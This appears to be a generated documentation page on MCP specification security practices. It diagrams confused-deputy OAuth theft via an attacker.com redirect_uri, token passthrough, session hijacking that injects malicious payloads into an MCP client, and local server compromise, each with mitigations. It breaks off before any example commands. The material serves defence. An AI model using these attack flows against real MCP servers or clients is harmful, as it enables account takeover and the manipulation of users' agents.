**Sources:** [docs/specification/draft/basic/authorization.mdx:41-73](), [docs/specification/draft/basic/security_best_practices.mdx:1-14]()

## Attack Vectors and Mitigations

### Confused Deputy Problem

The confused deputy attack exploits MCP proxy servers that act as intermediaries to third-party APIs, allowing attackers to obtain unauthorized access by leveraging consent cookies and dynamic client registration.

#### Vulnerable Conditions

This attack requires all of the following conditions:

| Condition | Description |
|-----------|-------------|
| **Static Client ID** | MCP proxy server uses fixed OAuth 2.0 `client_id` with third-party authorization server |
| **Dynamic Registration** | MCP proxy allows MCP clients to register dynamically, each receiving their own `client_id` |
| **Consent Cookie** | Third-party authorization server sets consent cookie after first authorization |
| **Missing Per-Client Consent** | MCP proxy does not implement consent checks before forwarding to third-party |

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:19-49]()

#### Attack Flow Diagrams

##### Normal OAuth Proxy Flow (Secure)

```mermaid
sequenceDiagram
    participant UA as "User-Agent<br/>(Browser)"
    participant MC as "MCP Client"
    participant M as "MCP Proxy Server"
    participant TAS as "Third-Party<br/>Authorization Server"

    Note over UA,M: "Initial authorization completed"
    
    M->>UA: "Redirect to third-party authorization"
    UA->>TAS: "Authorization request<br/>(client_id: mcp-proxy)"
    TAS->>UA: "Display consent screen"
    Note over UA: "User reviews and approves"
    UA->>TAS: "Approve consent"
    TAS->>UA: "Set consent cookie<br/>(client_id: mcp-proxy)"
    TAS->>UA: "3P Authorization code<br/>+ redirect to mcp-proxy-server.com"
    UA->>M: "3P Authorization code"
    Note over M,TAS: "Exchange 3P code for 3P token"
    Note over M: "Generate MCP authorization code"
    M->>UA: "Redirect to MCP Client<br/>with MCP authorization code"
```

**Normal OAuth Proxy Flow**

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:52-78]()

##### Confused Deputy Attack Flow (Vulnerable)

```mermaid
sequenceDiagram
    participant UA as "User-Agent<br/>(Browser)"
    participant M as "MCP Proxy Server"
    participant TAS as "Third-Party<br/>Authorization Server"
    participant A as "Attacker"

    Note over UA,A: "Attacker exploits existing consent cookie"
    A->>M: "Dynamically register malicious client<br/>redirect_uri: attacker.com"
    A->>UA: "Send malicious link"
    UA->>TAS: "Authorization request<br/>(client_id: mcp-proxy)<br/>+ existing consent cookie"
    
    rect rgb(240, 240, 240)
        Note over TAS: "Cookie present<br/>CONSENT SKIPPED"
    end
    
    TAS->>UA: "3P Authorization code<br/>+ redirect to mcp-proxy-server.com"
    UA->>M: "3P Authorization code"
    Note over M,TAS: "Exchange 3P code for 3P token"
    Note over M: "Generate MCP authorization code"
    M->>UA: "Redirect to attacker.com<br/>with MCP Authorization code"
    UA->>A: "MCP Authorization code<br/>delivered to attacker"
    Note over M,A: "Attacker exchanges code for token"
    A->>M: "Attacker impersonates user"
```

**Confused Deputy Attack Flow**

The attack succeeds because the third-party authorization server recognizes the consent cookie and bypasses the consent screen, while the MCP proxy redirects the authorization code to the attacker-controlled URI.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:80-106](), [docs/specification/draft/basic/security_best_practices.mdx:108-122]()

#### Mitigation: Per-Client Consent Implementation

MCP proxy servers **MUST** implement per-client consent that executes **before** the third-party authorization flow:

```mermaid
sequenceDiagram
    participant Client as "MCP Client"
    participant Browser as "User's Browser"
    participant MCP as "MCP Server"
    participant ThirdParty as "Third-Party<br/>AuthZ Server"

    Note over Client,ThirdParty: "1. Client Registration (Dynamic)"
    Client->>MCP: "Register with redirect_uri"
    MCP-->>Client: "client_id"

    Note over Client,ThirdParty: "2. MCP-Level Authorization Request"
    Client->>Browser: "Open MCP server authorization URL"
    Browser->>MCP: "GET /authorize<br/>?client_id=...&redirect_uri=..."

    rect rgb(240, 240, 240)
        MCP->>MCP: "Check consent for this client_id"
        Note over MCP: "Not previously approved"
    end

    MCP->>Browser: "Show MCP server-owned consent page"
    Note over Browser: "Allow [Client Name] to access<br/>[Third-Party API]?"
    Browser->>MCP: "POST /consent (approve)"
    MCP->>MCP: "Store consent decision<br/>for client_id"

    Note over Client,ThirdParty: "3. Forward to Third-Party"
    MCP->>Browser: "Redirect to third-party /authorize"
    Note over MCP: "Use static client_id<br/>for third-party"

    Browser->>ThirdParty: "Authorization request<br/>(static client_id)"
    ThirdParty->>Browser: "User authenticates & consents"
    ThirdParty->>Browser: "Redirect with auth code"

    Browser->>MCP: "Callback with third-party code"
    MCP->>ThirdParty: "Exchange code for token<br/>(using static client_id)"
    MCP->>Browser: "Redirect to client's<br/>registered redirect_uri"
```

**Per-Client Consent Flow**

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:124-167]()

#### Required Protections

**Per-Client Consent Storage**

MCP proxy servers **MUST**:
- Maintain a registry of approved `client_id` values per user
- Check this registry **before** initiating third-party authorization flow
- Store consent decisions securely (server-side database or server-specific cookies)

**Consent UI Requirements**

The MCP-level consent page **MUST**:
- Clearly identify requesting MCP client by name
- Display specific third-party API scopes being requested
- Show registered `redirect_uri` where tokens will be sent
- Implement CSRF protection (`state` parameter, CSRF tokens)
- Prevent iframing via `frame-ancestors` CSP directive or `X-Frame-Options: DENY`

**Consent Cookie Security**

If using cookies to track consent decisions, they **MUST**:
- Use `__Host-` prefix for cookie names
- Set `Secure`, `HttpOnly`, and `SameSite=Lax` attributes
- Be cryptographically signed or use server-side sessions
- Bind to specific `client_id` (not just "user has consented")

**Redirect URI Validation**

MCP proxy server **MUST**:
- Validate `redirect_uri` exactly matches registered URI
- Reject requests if `redirect_uri` changed without re-registration
- Use exact string matching (not pattern matching or wildcards)

**OAuth State Parameter Validation**

MCP proxy servers implementing OAuth flows **MUST**:
- Generate cryptographically secure random `state` value for each authorization request
- Store `state` value server-side **only after** consent has been explicitly approved
- Set state tracking cookie/session **immediately before** redirecting to third-party identity provider
- Validate at callback endpoint that `state` query parameter exactly matches stored value
- Reject any callback requests where `state` parameter is missing or does not match
- Ensure `state` values are single-use (delete after validation) with short expiration (e.g., 10 minutes)

The consent cookie or session containing `state` **MUST NOT** be set until **after** user has approved consent screen. Setting this cookie before consent approval renders the consent screen ineffective.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:169-220](), [docs/specification/draft/basic/authorization.mdx:672-678]()

### Token Passthrough

Token passthrough is an anti-pattern where an MCP server accepts tokens from an MCP client without validating that tokens were properly issued to the MCP server itself, then forwards these unmodified tokens to downstream APIs.

#### Risks and Attack Surface

| Risk Category | Description |
|---------------|-------------|
| **Security Control Circumvention** | Downstream APIs implementing rate limiting, request validation, or traffic monitoring based on token audience or credential constraints can be bypassed when clients obtain and use tokens directly |
| **Accountability Loss** | MCP Server cannot identify or distinguish between MCP Clients when they call with upstream-issued access tokens that may be opaque to the MCP Server |
| **Audit Trail Corruption** | Downstream Resource Server logs show requests appearing to come from different source with different identity, making incident investigation and controls difficult |
| **Trust Boundary Violations** | Downstream Resource Server grants trust to specific entities with assumptions about origin or client behavior patterns that are broken by proxy forwarding |
| **Token Replay Attacks** | If token is accepted by multiple services without proper validation, an attacker compromising one service can use the token to access other connected services |
| **Future Compatibility Risk** | Starting without proper token audience separation makes it difficult to evolve security model when MCP Server needs to add security controls later |

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:222-241]()

#### Architecture: Token Passthrough vs. Proper Token Exchange

```mermaid
graph TB
    subgraph "ANTI-PATTERN: Token Passthrough"
        Client1["MCP Client"]
        Server1["MCP Server"]
        AuthServer1["Authorization Server<br/>(Upstream API)"]
        API1["Upstream API"]
        
        Client1 -->|"1. Request token<br/>audience=upstream-api"| AuthServer1
        AuthServer1 -->|"2. Token<br/>(aud: upstream-api)"| Client1
        Client1 -->|"3. Bearer Token<br/>(aud: upstream-api)"| Server1
        
        rect rgb(240, 240, 240)
            Server1 -->|"4. PASSTHROUGH<br/>Same token forwarded"| API1
            Note over Server1: "VULNERABILITY:<br/>No audience validation<br/>Token not issued for MCP Server"
        end
    end
    
    subgraph "CORRECT PATTERN: Separate Token Issuance"
        Client2["MCP Client"]
        Server2["MCP Server"]
        AuthServer2a["MCP Authorization Server"]
        AuthServer2b["Upstream API<br/>Authorization Server"]
        API2["Upstream API"]
        
        Client2 -->|"1. Request token<br/>audience=mcp-server"| AuthServer2a
        AuthServer2a -->|"2. Token<br/>(aud: mcp-server)"| Client2
        Client2 -->|"3. Bearer Token<br/>(aud: mcp-server)"| Server2
        
        rect rgb(240, 240, 240)
            Note over Server2: "VALIDATES:<br/>Audience = mcp-server<br/>Token issued for this server"
        end
        
        Server2 -->|"4. Request new token<br/>audience=upstream-api"| AuthServer2b
        AuthServer2b -->|"5. Token<br/>(aud: upstream-api)"| Server2
        Server2 -->|"6. Bearer Token<br/>(aud: upstream-api)"| API2
    end
```

**Token Passthrough Anti-Pattern vs. Correct Token Exchange**

In the anti-pattern, the MCP Server forwards tokens that were issued for a different audience. In the correct pattern, the MCP Server validates tokens issued specifically for it and obtains separate tokens for downstream APIs.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:222-241](), [docs/specification/draft/basic/authorization.mdx:686-700]()

#### Mitigation Requirements

MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server.

MCP servers **MUST** validate access tokens before processing requests, ensuring the access token is issued specifically for the MCP server according to [OAuth 2.1 Section 5.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1-13#section-5.2).

MCP servers **MUST** only accept tokens specifically intended for themselves and **MUST** reject tokens that do not include them in the audience claim or otherwise verify they are the intended recipient.

If the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client.

MCP clients **MUST** implement the `resource` parameter as defined in RFC 8707 to explicitly specify the target resource for which the token is being requested.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:242-244](), [docs/specification/draft/basic/authorization.mdx:403-418](), [docs/specification/draft/basic/authorization.mdx:471-486](), [docs/specification/draft/basic/authorization.mdx:686-700]()

### Session Hijacking

Session hijacking attacks occur when an unauthorized party obtains and uses a session ID to impersonate the original client and perform unauthorized actions.

#### Attack Scenario 1: Session Hijack Prompt Injection

This attack targets stateful HTTP servers that handle MCP requests using shared queues or event systems:

```mermaid
sequenceDiagram
    participant Client
    participant ServerA as "Server A"
    participant Queue as "Shared Queue<br/>(keyed by session_id)"
    participant ServerB as "Server B"
    participant Attacker

    Client->>ServerA: "Initialize<br/>(connect to streamable HTTP server)"
    ServerA-->>Client: "Respond with session_id"

    Attacker->>ServerB: "Access/guess session_id"
    Note over Attacker: "Attacker knows/guesses session_id"

    Attacker->>ServerB: "Trigger event<br/>(malicious payload, using session_id)"
    ServerB->>Queue: "Enqueue event<br/>(keyed by session_id)"

    ServerA->>Queue: "Poll for events<br/>(using session_id)"
    Queue-->>ServerA: "Event data<br/>(malicious payload)"

    ServerA-->>Client: "Async response<br/>(malicious payload)"
    Client->>Client: "Acts based on malicious payload"
```

**Session Hijack Prompt Injection Flow**

When a server supports redelivery/resumable streams, deliberately terminating the request before receiving the response could lead to it being resumed by the original client via GET request for server-sent events. If a server initiates server-sent events as a consequence of a tool call such as `notifications/tools/list_changed`, where it is possible to affect the tools offered by the server, a client could end up with tools they were not aware were enabled.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:246-274](), [docs/specification/draft/basic/security_best_practices.mdx:296-309]()

#### Attack Scenario 2: Session Hijack Impersonation

```mermaid
sequenceDiagram
    participant Client
    participant Server as "MCP Server"
    participant Attacker

    Client->>Server: "Initialize<br/>(login/authenticate)"
    Server-->>Client: "Respond with session_id<br/>(persistent session created)"

    Attacker->>Server: "Access/guess session_id"
    Note over Attacker: "Attacker knows/guesses session_id"

    Attacker->>Server: "Make API call<br/>(using session_id, no re-auth)"
    Server-->>Attacker: "Respond as if Attacker is Client<br/>(session hijack)"
```

**Session Hijack Impersonation Flow**

The MCP client authenticates with the MCP server, creating a persistent session ID. The attacker obtains the session ID and makes calls to the MCP server using it. The MCP server does not check for additional authorization and treats the attacker as a legitimate user.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:276-292](), [docs/specification/draft/basic/security_best_practices.mdx:310-316]()

#### Mitigation Requirements

MCP servers that implement authorization **MUST** verify all inbound requests.

MCP Servers **MUST NOT** use sessions for authentication.

MCP servers **MUST** use secure, non-deterministic session IDs. Generated session IDs (e.g., UUIDs) **SHOULD** use secure random number generators. Avoid predictable or sequential session identifiers. Rotating or expiring session IDs reduces risk.

MCP servers **SHOULD** bind session IDs to user-specific information. When storing or transmitting session-related data (e.g., in a queue), combine the session ID with information unique to the authorized user, such as their internal user ID. Use a key format like `<user_id>:<session_id>`. This ensures that even if an attacker guesses a session ID, they cannot impersonate another user as the user ID is derived from the user token and not provided by the client.

MCP servers can optionally leverage additional unique identifiers.

**Sources:** [docs/specification/draft/basic/security_best_practices.mdx:318-331]()

### Local MCP Server Compromise

Local MCP servers are binaries downloaded and executed on the same machine as the MCP client. Without proper sandboxing and consent requirements, they pose significant security risks.

#### Attack Vectors

Local MCP servers with inadequate restrictions introduce several attack vectors:

1. **Configuration-Based Code Execution**: Attacker includes malicious "startup" command in client configuration
2. **Malicious Server Distribution**: Attacker distributes malicious payload inside the server binary itself
3. **Insecure Local Server Access**: Attacker accesses insecure local server left running on localhost via DNS rebinding

Example malicious startup commands:

```bash